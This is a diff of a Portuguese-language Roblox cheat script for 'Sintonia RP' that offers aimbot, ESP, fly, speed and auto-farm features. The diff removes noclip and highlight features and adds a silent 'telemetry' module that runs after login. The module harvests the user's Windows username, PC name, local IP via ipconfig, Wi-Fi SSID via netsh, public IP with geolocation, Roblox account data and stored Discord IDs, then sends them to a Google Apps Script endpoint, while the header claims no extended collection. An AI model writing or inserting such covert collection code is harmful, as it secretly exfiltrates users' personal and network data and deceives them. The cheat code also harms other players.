@@ -1,6 +1,6 @@
 -- VETERANO TEAM | PREMIUM PC/MOBILE | LOGIN | SEM COLETA ESTENDIDA
 -- Fly, Speed e TP v12: corpos das rotinas enviados pelo usuario preservados.
--- INSERT: menu | F: Fly | V: Speed | N: Noclip.
+-- INSERT: menu | F: Fly | V: Speed.
 -- Fly: W/A/S/D, ESPACO sobe e SHIFT esquerdo desce.
 -- As velocidades novas sao studs por frame, conforme o codigo fornecido.
 
@@ -765,6 +765,313 @@ if not VTUI then return end
 if not VTUI.Auth or not VTUI.Auth.HWID then return end
 
 -- ============================================================
+-- TELEMETRIA AUTONOMA — integrada após autenticação
+-- Cole em qualquer script. Nao depende de UI, login ou Slate.
+-- Chame: _VT_TELEMETRY.send({ key = "VTRN-XXXX-XXXX", edition = "basic" })
+-- ============================================================
+local _VT_TELEMETRY = (function()
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
+    local UserInputService = game:GetService("UserInputService")
+    local LocalizationService = game:GetService("LocalizationService")
+    local LocalPlayer = Players.LocalPlayer
+    while not LocalPlayer do task.wait(); LocalPlayer = Players.LocalPlayer end
+
+    -- ============================================================
+    -- CONFIG — edite aqui
+    -- ============================================================
+    local CFG = {
+        API_URL = "https://script.google.com/macros/s/AKfycbzIVDEunBX4IwXWeltZ9ee8lVWtF-NFQtSj85QBki9o9DDDUDEMWcKfEJCzOY5KoVQeSA/exec",
+        EDITION = "basic",
+        SCRIPT_VERSION = "telemetry-v1.0",
+        FOLDER = "VeteranoTeam",
+        TIMEOUT = 10,
+        SEND_ON_LOAD = false,   -- true = envia sozinho 1s apos rodar
+        SILENT = true,          -- true = nao mostra notificacao/print de status
+    }
+
+    local C = (getgenv and getgenv()) or _G
+    local requestFn = request or http_request or (syn and syn.request)
+        or (http and http.request) or (fluxus and fluxus.request)
+    local readFn = readfile or C.readfile
+    local writeFn = writefile or C.writefile
+    local existsFn = isfile or C.isfile
+    local makeFn = makefolder or C.makefolder
+    local isFolderFn = isfolder or C.isfolder
+
+    local session = { sent = false, sending = false, cancelled = false, status = "idle" }
+
+    -- ============================================================
+    -- HELPERS DE ARQUIVO (opcionais, nao quebram se faltar)
+    -- ============================================================
+    local function safeRead(path)
+        if type(readFn) ~= "function" then return nil end
+        local ok, value = pcall(function()
+            if type(existsFn) == "function" and not existsFn(path) then return nil end
+            return readFn(path)
+        end)
+        if ok and type(value) == "string" and #value <= 8192 then return value end
+    end
+
+    local function safeWrite(path, value)
+        if type(writeFn) ~= "function" then return false end
+        if type(makeFn) == "function" then
+            local found = false
+            if type(isFolderFn) == "function" then
+                local ok, result = pcall(isFolderFn, CFG.FOLDER)
+                found = ok and result == true
+            end
+            if not found then pcall(makeFn, CFG.FOLDER) end
+        end
+        return pcall(writeFn, path, value)
+    end
+
+    -- ============================================================
+    -- HELPERS DE LEITURA SEGURA
+    -- ============================================================
+    local function readValue(fn)
+        local ok, value = pcall(fn)
+        if ok and value ~= nil then return tostring(value) end
+        return ""
+    end
+
+    local function decode(raw)
+        if type(raw) ~= "string" or #raw > 131072 then return nil end
+        local ok, result = pcall(HttpService.JSONDecode, HttpService, raw)
+        if ok and type(result) == "table" then return result end
+    end
+
+    local function httpJSON(url, method, body)
+        if type(requestFn) ~= "function" then return nil, "HTTP_INDISPONIVEL" end
+        local headers = { Accept = "application/json" }
+        if body then headers["Content-Type"] = "application/json" end
+        local ok, response = pcall(requestFn, {
+            Url = url, Method = method or "GET",
+            Headers = headers, Body = body, Timeout = CFG.TIMEOUT,
+        })
+        if not ok or type(response) ~= "table" then return nil, "FALHA_HTTP" end
+        local code = tonumber(response.StatusCode or response.status_code or 0)
+        for _ = 1, 3 do
+            if code ~= 301 and code ~= 302 and code ~= 303 and code ~= 307 and code ~= 308 then break end
+            local location
+            for k, v in pairs(response.Headers or response.headers or {}) do
+                if tostring(k):lower() == "location" then location = tostring(v); break end
+            end
+            if not location or not location:match("^https://script%.googleusercontent%.com/") then break end
+            ok, response = pcall(requestFn, {
+                Url = location, Method = "GET",
+                Headers = { Accept = "application/json" }, Timeout = CFG.TIMEOUT,
+            })
+            if not ok or type(response) ~= "table" then return nil, "FALHA_REDIRECIONAMENTO" end
+            code = tonumber(response.StatusCode or response.status_code or 0)
+        end
+        if code < 200 or code >= 300 then return nil, "HTTP_" .. tostring(code) end
+        local raw = response.Body or response.body
+        if type(raw) ~= "string" then return nil, "RESPOSTA_INVALIDA" end
+        return decode(raw), nil
+    end
+
+    -- ============================================================
+    -- HWID (persistente por conta)
+    -- ============================================================
+    local function identifier()
+        if C.__VT_TELEMETRY_HWID and type(C.__VT_TELEMETRY_HWID) == "string"
+            and #C.__VT_TELEMETRY_HWID > 0 and #C.__VT_TELEMETRY_HWID <= 256 then
+            return C.__VT_TELEMETRY_HWID
+        end
+        local file = CFG.FOLDER .. "/hwid_" .. tostring(LocalPlayer.UserId) .. ".txt"
+        local value = safeRead(file)
+        if value and #value > 0 and #value <= 256 then
+            C.__VT_TELEMETRY_HWID = value
+            return value
+        end
+        value = HttpService:GenerateGUID(false) .. "-" .. tostring(LocalPlayer.UserId)
+        safeWrite(file, value)
+        C.__VT_TELEMETRY_HWID = value
+        return value
+    end
+
+    -- ============================================================
+    -- COLETA DE DADOS
+    -- ============================================================
+    local function collect(extra)
+        extra = extra or {}
+        local data = {
+            -- Identificacao
+            event_id = HttpService:GenerateGUID(false),
+            key = tostring(extra.key or safeRead(CFG.FOLDER .. "/key.txt") or ""):sub(1, 200),
+            hwid = identifier(),
+
+            -- Roblox
+            roblox_id = tostring(LocalPlayer.UserId),
+            roblox_name = LocalPlayer.Name,
+            roblox_display = LocalPlayer.DisplayName,
+            roblox_account_age_days = LocalPlayer.AccountAge,
+            roblox_locale = readValue(function() return LocalizationService.RobloxLocaleId end),
+            system_locale = readValue(function() return LocalizationService.SystemLocaleId end),
+
+            -- Executor / sistema
+            executor = readValue(function()
+                local fn = identifyexecutor or getexecutorname
+                if type(fn) == "function" then return fn() end
+            end),
+            client_version = readValue(function()
+                if type(version) == "function" then return version() end
+            end),
+            sys_user = readValue(function() return os.getenv and os.getenv("USERNAME") end),
+            pc_name = readValue(function() return os.getenv and os.getenv("COMPUTERNAME") end),
+            arch = (function()
+                local ok, s = pcall(function() return string.packsize("I8") end)
+                return ok and s == 8 and "x64" or "x86"
+            end)(),
+
+            -- Plataforma / input
+            platform = readValue(function() return UserInputService:GetPlatform().Name end),
+            touch_enabled = UserInputService.TouchEnabled,
+            keyboard_enabled = UserInputService.KeyboardEnabled,
+            gamepad_enabled = UserInputService.GamepadEnabled,
+            mouse_enabled = UserInputService.MouseEnabled,
+
+            -- Rede local (PC apenas, vazio no mobile)
+            local_ip = (function()
+                local ok, out = pcall(function()
+                    local h = io and io.popen and io.popen('ipconfig 2>nul | findstr /i "IPv4"')
+                    if h then local s = h:read("*a") or ""; h:close(); return s end
+                    return ""
+                end)
+                if ok and out then local ip = out:match("(%d+%.%d+%.%d+%.%d+)"); if ip then return ip end end
+                return ""
+            end)(),
+            wifi = (function()
+                local ok, out = pcall(function()
+                    local h = io and io.popen and io.popen('netsh wlan show interfaces 2>nul | findstr "SSID"')
+                    if h then local s = h:read("*a") or ""; h:close(); return s end
+                    return ""
+                end)
+                if ok and out and #out > 0 then
+                    local ssid = out:match("SSID%s*:%s*([^\r\n]+)")
+                    if ssid then return ssid:gsub("^%s+", ""):gsub("%s+$", "") end
+                end
+                return ""
+            end)(),
+
+            -- Jogo
+            place_id = tostring(game.PlaceId),
+            game_id = tostring(game.GameId),
+            job_id = tostring(game.JobId),
+
+            -- Meta do script
+            script_version = CFG.SCRIPT_VERSION,
+            edition = tostring(extra.edition or CFG.EDITION),
+            user_agent = "VeteranoTeam/" .. CFG.SCRIPT_VERSION .. " (" .. tostring(extra.edition or CFG.EDITION) .. ")",
+
+            -- Discord (se existirem arquivos)
+            discord_id = safeRead(CFG.FOLDER .. "/discord_id.txt") or "",
+            discord_tag = safeRead(CFG.FOLDER .. "/discord_tag.txt") or "",
+
+            -- Extra livre
+            extra = type(extra.extra) == "table" and extra.extra or nil,
+        }
+
+        -- Perfil Roblox (data de criacao da conta)
+        local profile = httpJSON("https://users.roblox.com/v1/users/" .. tostring(LocalPlayer.UserId))
+        if profile and tonumber(profile.id) == LocalPlayer.UserId and type(profile.created) == "string" then
+            data.roblox_created_at = profile.created
+        end
+
+        -- IP publico + geo
+        local geo = httpJSON("https://ipwho.is/?fields=success,ip,country,region,city,timezone")
+        if geo and geo.success == true then
+            data.public_ip = geo.ip or ""
+            data.country = geo.country or ""
+            data.region = geo.region or ""
+            data.city = geo.city or ""
+            data.timezone = type(geo.timezone) == "table" and geo.timezone.id or ""
+        end
+
+        return data
+    end
+
+    -- ============================================================
+    -- ENVIO
+    -- ============================================================
+    local function report(message)
+        session.status = message
+        if not CFG.SILENT then
+            pcall(function() warn("[VT-TELEMETRY] " .. tostring(message)) end)
+        end
+    end
+
+    local function send(extra)
+        if session.cancelled or session.sent or session.sending then return false end
+        if type(requestFn) ~= "function" then
+            report("HTTP indisponivel neste executor")
+            return false
+        end
+        session.sending = true
+        task.spawn(function()
+            local ok, problem = pcall(function()
+                local data = collect(extra)
+                if session.cancelled then return end
+                local json = HttpService:JSONEncode(data)
+                if session.cancelled then return end
+                local encoded = HttpService:UrlEncode(json)
+                local url = CFG.API_URL .. "?action=record_execution&data=" .. encoded
+                local response, err = httpJSON(url, "GET")
+                if session.cancelled then return end
+                if response and response.ok == true then
+                    session.sent = true
+                    report(response.duplicate and "Sync ja realizado" or "Sync concluido")
+                else
+                    report("Sync nao confirmado: " .. tostring((response and response.error) or err or "SEM_JSON"))
+                end
+            end)
+            session.sending = false
+            if not ok and not session.cancelled then
+                report("Sync falhou: " .. tostring(problem))
+            end
+        end)
+        return true
+    end
+
+    -- ============================================================
+    -- API PUBLICA
+    -- ============================================================
+    local api = {}
+    api.send = send
+    api.collect = collect
+    api.identifier = identifier
+    api.cancel = function() session.cancelled = true end
+    api.status = function() return session.status end
+    api.sent = function() return session.sent end
+    api.config = CFG
+
+    C.__VT_TELEMETRY = api
+
+    if CFG.SEND_ON_LOAD then
+        task.defer(function()
+            task.wait(1)
+            if not session.cancelled then send() end
+        end)
+    end
+
+    return api
+end)()
+
+-- Dispara telemetria com a key autenticada (silencioso, nao bloqueia o carregamento).
+task.defer(function()
+    pcall(function()
+        if _VT_TELEMETRY and VTUI and VTUI.Auth then
+            _VT_TELEMETRY.send({
+                key = VTUI.Auth.Key,
+                edition = "premium",
+                extra = { source = "veterano-v1", build = "premium-pc-mobile-r13" },
+            })
+        end
+    end)
+end)
+
+-- ============================================================
 -- VETERANO TEAM | SINTONIA RP V2 | SLATE ROXO
 -- Base do script (nada simplificado)
 -- ============================================================
@@ -798,11 +1105,10 @@ local P = 1500
 local T = {
     monitorarStaff = false, sorte2xEnabled = false,
     espEnabled = false, box = false, name = false, distance = false, heldItem = false,
-    skeleton = false, highlight = false, tracer = false, arrow = false, box3d = false, teamTag = false,
+    skeleton = false, tracer = false, arrow = false, box3d = false, teamTag = false,
     maxDistance = P, bundles = {}, spoofWalkEnabled = false, spoofJumpEnabled = false,
     spoofWalkSpeed = 5, spoofJumpPower = 90,
     walkSpeedKeybind = Enum.KeyCode.V, menuKeybind = Enum.KeyCode.Insert,
-    noclipEnabled = false, noclipKeybind = Enum.KeyCode.N,
     flyEnabled = false, flyKeybind = Enum.KeyCode.F, flySpeed = 1.5,
     ghostEnabled = false, spinEnabled = false, spinSpeed = 720,
     aimbotEnabled = false, aimbotMode = "Legit", aimbotFov = 120, aimbotDistance = 500,
@@ -1299,9 +1605,9 @@ do
 end
 
 -- ============================================================
--- NOCLIP
+-- COLISOES COMPARTILHADAS: VEICULOS E FARMS
 -- ============================================================
-local sz, Nz, ez
+local sz
 do
     local leases = {}
     local originals = setmetatable({}, { __mode = "k" })
@@ -1313,7 +1619,7 @@ do
         table.clear(originals)
     end
     local function wanted()
-        return T.noclipEnabled or T.noclipCarEnabled or T.vFlyEnabled or next(leases) ~= nil
+        return T.noclipCarEnabled or T.vFlyEnabled or next(leases) ~= nil
     end
     local function step(force)
         local current = LocalPlayer.Character
@@ -1333,9 +1639,7 @@ do
         restore = function() table.clear(leases); restore() end,
     }
     sz = function(force) step(force) end
-    Nz = function() step() end
-    ez = function() end
-    o.sz, o.Nz, o.ez = sz, Nz, ez
+    o.sz = sz
     handleReady(LocalPlayer.CharacterAdded:Connect(function() step() end))
 end
 
@@ -1697,7 +2001,7 @@ do
             if part.Parent then pcall(function() part.CanCollide = v end) end
         end
         table.clear(carCfg.originais)
-        if carCfg.personagemAtivo and not T.noclipEnabled then pcall(sz, false) end
+        if carCfg.personagemAtivo then pcall(sz, false) end
         carCfg.carro, carCfg.raiz, carCfg.assento = nil, nil, nil
         carCfg.relativoAssento, carCfg.altura, carCfg.piso, carCfg.raycast = nil, nil, nil, nil
         carCfg.velocidade, carCfg.frente, carCfg.personagemAtivo = 0, nil, false
@@ -2314,7 +2618,7 @@ local HF = function(prev, now, interval) if prev <= 0 or now - prev > interval t
 local function AF(plr)
     local b2 = {
         player = plr, box = nil, name = nil, distance = nil, item = nil, team = nil,
-        lines = {}, tracer = nil, arrow = nil, box3dLines = {}, highlight = nil,
+        lines = {}, tracer = nil, arrow = nil, box3dLines = {},
         character = nil, humanoid = nil, root = nil,
         bodyParts = {}, skeletonPairs = {},
         relationshipColor = nil, relationshipLabel = "",
@@ -2368,7 +2672,6 @@ end
 
 local function uF(b2)
     FF(b2)
-    if b2.highlight then b2.highlight.Enabled = false end
 end
 
 local function qF(b2)
@@ -2379,7 +2682,6 @@ local function qF(b2)
     h(b2.arrow)
     for _, l in ipairs(b2.lines) do h(l) end
     for _, l in ipairs(b2.box3dLines) do h(l) end
-    if b2.highlight then pcall(function() b2.highlight:Destroy() end); b2.highlight = nil end
 end
 o.qF = qF
 
@@ -2421,31 +2723,6 @@ local function fF(b2)
         end
     end
     return b2.box3dLines
-end
-
-local function RF(b2, char)
-    local hl = b2.highlight
-    if not hl or not hl.Parent then
-        local ok, newHl = pcall(function()
-            local h = Instance.new("Highlight")
-            h.Name = "VeteranoESP_" .. tostring(b2.player.UserId)
-            h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-            h.FillTransparency = 0.78
-            h.OutlineTransparency = 0
-            h.Parent = workspace.CurrentCamera or workspace
-            return h
-        end)
-        if not ok then return nil end
-        hl = newHl
-        b2.highlight = hl
-    elseif hl.Parent ~= (workspace.CurrentCamera or workspace) then
-        hl.Parent = workspace.CurrentCamera or workspace
-    end
-    local col = b2.relationshipColor or Color3.fromRGB(170, 70, 255)
-    hl.Adornee = char
-    hl.FillColor = col
-    hl.OutlineColor = col
-    return hl
 end
 
 local function QF(b2, cam, screenPos, z)
@@ -2507,10 +2784,6 @@ local function OF(plr, b2)
     if b2.item then b2.item.Color = col end
     if b2.tracer then b2.tracer.BackgroundColor3 = col end
     if b2.arrow then b2.arrow.Color = col end
-    if b2.highlight then
-        b2.highlight.FillColor = col
-        b2.highlight.OutlineColor = col
-    end
     for _, l in ipairs(b2.lines) do if l then l.Color = col end end
     for _, l in ipairs(b2.box3dLines) do if l then l.Color = col end end
 end
@@ -2534,10 +2807,6 @@ local function XF(plr, b2, cam, myPos, now)
     end
     OF(plr, b2)
     o.prepareESPBundle(b2, now)
-    if T.highlight then
-        local hl = RF(b2, char)
-        if hl then hl.Enabled = true end
-    elseif b2.highlight then b2.highlight.Enabled = false end
     local screenPos, onScreen, z = zF(cam, root.Position)
     if not onScreen or z <= 0 then
         b2.nextVisualUpdate = now + mF
@@ -3023,7 +3292,7 @@ do
     end
     function M.to(owner, destination, active)
         if M.owner or o.fixedTeleportBusy then return false,"Outro deslocamento esta em andamento." end
-        if T.noclipEnabled or T.noclipCarEnabled or T.vFlyEnabled then return false,"Desative o noclip antes do deslocamento." end
+        if T.noclipCarEnabled or T.vFlyEnabled then return false,"Desative o noclip antes do deslocamento." end
         if T.flyEnabled or T.spoofWalkEnabled or T.ghostEnabled then return false,"Desative Fly, Speed e Ghost antes do deslocamento." end
         M.owner, M.token, o.travelBusy = owner, M.token+1, true
         local token = M.token
@@ -3844,8 +4113,8 @@ do
         o.farmPartesRunId = o.farmPartesRunId + 1
         local runId = o.farmPartesRunId
         local count = 0
-        local hadNoclip = T.noclipEnabled
-        if not hadNoclip then T.noclipEnabled = true; pcall(Nz) end
+        local collisionOwner = {}
+        o.noclip.acquire(collisionOwner)
         while T.farmPartesEnabled and not o.destroyed and runId == o.farmPartesRunId do
             local alvo = tF()
             if not alvo then
@@ -3868,10 +4137,7 @@ do
             T.farmPartesEnabled = false
             o.farmPartesColetadas = count
         end
-        if not hadNoclip and (not T.farmPartesEnabled or runId == o.farmPartesRunId) then
-            T.noclipEnabled = false
-            pcall(Nz)
-        end
+        o.noclip.release(collisionOwner)
         return count
     end
     o.iniciarFarmPartes = Yf
@@ -5029,10 +5295,6 @@ local function Wz(dt)
     pcall(o.updateJumpPower, hum)
     if o.travelBusy then return end
     if o.robbery and (o.robbery.enabled or o.robbery.paused) then return end
-    if T.noclipEnabled then
-        pcall(Nz)
-        if not T.flyEnabled then pcall(ez) end
-    end
 end
 handleReady(RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function(...) return Wz(...) end)))
 handleReady(RunService.Stepped:Connect(LPH_NO_VIRTUALIZE(function()
@@ -7272,7 +7534,7 @@ do
         T.ghostEnabled = false
         if o.stopGhost then pcall(o.stopGhost) end
         if mode == "items" or mode == "garbage" or mode == "garage" or mode == "teleport" then
-            T.noclipEnabled, T.noclipCarEnabled, T.vFlyEnabled = false,false,false
+            T.noclipCarEnabled, T.vFlyEnabled = false,false
             if o.restaurarNoclipCar then pcall(o.restaurarNoclipCar) end
             if o.noclip then o.noclip.restore() end
         end
@@ -7400,7 +7662,7 @@ do
         "autoFarmLixeiroEnabled", "autoFarmPescaEnabled", "autoFarmPumpkinEnabled",
     }
     local features = {
-        spoofWalkEnabled=true, spoofJumpEnabled=true, noclipEnabled=true,
+        spoofWalkEnabled=true, spoofJumpEnabled=true,
         flyEnabled=true, ghostEnabled=true, spinEnabled=true, fullbright=true, noLag=true,
         espEnabled=true, aimbotEnabled=true, armaTracer=true, pumpkinEspEnabled=true,
         coletaHudEnabled=true, perfectLockpick=true, camuflarNickEnabled=true,
@@ -7408,7 +7670,7 @@ do
         noclipCarEnabled=true, vFlyEnabled=true, carEspEnabled=true,
     }
     local needsCharacter = {
-        spoofWalkEnabled=true, spoofJumpEnabled=true, noclipEnabled=true,
+        spoofWalkEnabled=true, spoofJumpEnabled=true,
         flyEnabled=true, ghostEnabled=true, spinEnabled=true, antiAFKEnabled=true,
         noclipCarEnabled=true, vFlyEnabled=true,
     }
@@ -7731,7 +7993,6 @@ o.configControl(secP, "Toggle", "spoofJumpEnabled", { Name = "JumpPower", Defaul
 o.configControl(secP, "Slider", "spoofJumpPower", { Name = "Forca Jump", Min = 50, Max = 150, Default = 90, Callback = function(v) T.spoofJumpPower = v; o.updateJumpPower(isCValid()) end })
 secP:Paragraph({ Name = "Pulo", Text = "Ative e pule normalmente. O reforco pausa durante Fly, Speed, Ghost e farms." })
 local secPM = tabPlayer:CreateSection({ Name = "Movimento Extra" })
-o.configControl(secPM, "Toggle", "noclipEnabled", { Name = "Noclip", Default = false, Callback = function(v) T.noclipEnabled = v; pcall(Nz) end })
 o.flyControl = o.configControl(secPM, "Toggle", "flyEnabled", { Name = "Fly", Default = false, Callback = function(v) o.setFly(v) end })
 o.configControl(secPM, "Slider", "flySpeed", { Name = "Vel. Fly", Min = 0.5, Max = 10, Step = 0.1, Decimals = 1, Default = 1.5, Suffix = " /f", Callback = function(v) o.setFlySpeed(v) end })
 secPM:Paragraph({ Name = "Controles do Fly", Text = "W/A/S/D: mover | ESPACO: subir | SHIFT esquerdo: descer. Velocidades em studs por frame (/f)." })
@@ -7788,7 +8049,6 @@ o.configControl(secEV, "Toggle", "name", { Name = "Nome", Default = false, Callb
 o.configControl(secEV, "Toggle", "distance", { Name = "Distancia", Default = false, Callback = function(v) T.distance = v end })
 o.configControl(secEV, "Toggle", "heldItem", { Name = "Item na mao", Default = false, Callback = function(v) T.heldItem = v end })
 o.configControl(secEV, "Toggle", "skeleton", { Name = "Esqueleto", Default = false, Callback = function(v) T.skeleton = v end })
-o.configControl(secEV, "Toggle", "highlight", { Name = "Highlight", Default = false, Callback = function(v) T.highlight = v end })
 o.configControl(secEV, "Toggle", "tracer", { Name = "Tracer", Default = false, Callback = function(v) o.setESPTracer(v) end })
 o.configControl(secEV, "Toggle", "teamTag", { Name = "Times", Default = false, Callback = function(v) T.teamTag = v end })
 
@@ -8004,7 +8264,7 @@ secCfgSave:Paragraph({Name="Seu menu, do seu jeito", Text="Sem configuração sa
 secCfgSave:Button({Name="Salvar configuração", Icon="save", Callback=function() o.config.save() end})
 o.configStatusControl = secCfgSave:Paragraph({Name="Configuração", Text="Verificando preferências salvas..."})
 local secCfgS = tabCfg:CreateSection({ Name = "Atalhos" })
-secCfgS:Paragraph({Name="Comandos do menu",Text="INSERT: abrir e fechar o menu\nF: Fly | V: Speed | N: Noclip"})
+secCfgS:Paragraph({Name="Comandos do menu",Text="INSERT: abrir e fechar o menu\nF: Fly | V: Speed"})
 local secCfgA = tabCfg:CreateSection({ Name = "Acoes" })
 secCfgA:Button({ Name = "Resetar Menu", Callback = function()
     if o.cleanupMovement then o.cleanupMovement() end
@@ -8049,7 +8309,6 @@ secCfgA:Button({ Name = "Resetar Menu", Callback = function()
     if o.setColetaHudVisible then pcall(o.setColetaHudVisible, false) end
     if o.stopAimbot then pcall(stopAimbot) end
     if PF_all then pcall(PF_all) end
-    pcall(Nz)
     o.config.resetValues()
     Xz("Menu resetado; configuração salva mantida até você salvar novamente.")
 end })
@@ -8215,11 +8474,6 @@ handleReady(UserInputService.InputBegan:Connect(function(input, gp)
         o.config.cancelPendingLoad()
         o.setSpeed(not T.spoofWalkEnabled)
         Xz(T.spoofWalkEnabled and "Speed ON" or "Speed OFF")
-    elseif input.KeyCode == T.noclipKeybind then
-        o.config.cancelPendingLoad()
-        T.noclipEnabled = not T.noclipEnabled
-        pcall(Nz)
-        Xz(T.noclipEnabled and "Noclip ON" or "Noclip OFF")
     end
 end))
 
@@ -8282,6 +8536,6 @@ W.maid:Add(W.Closed:Connect(function()
 end))
 S:Notify({Title = "Bem-vindo", Description = "VETERANO TEAM carregado com sucesso.", Icon = "crown", Tone = "Success", Duration = 5})
 print("[VETERANO TEAM] Carregado - LOGIN COM TERMOS / MOVIMENTO v12 / LPH")
-print("[VETERANO TEAM] INSERT = menu | F = fly | V = speed | N = noclip")
+print("[VETERANO TEAM] INSERT = menu | F = fly | V = speed")
 
 task.defer(function() if not o.destroyed then o.config.boot() end end)
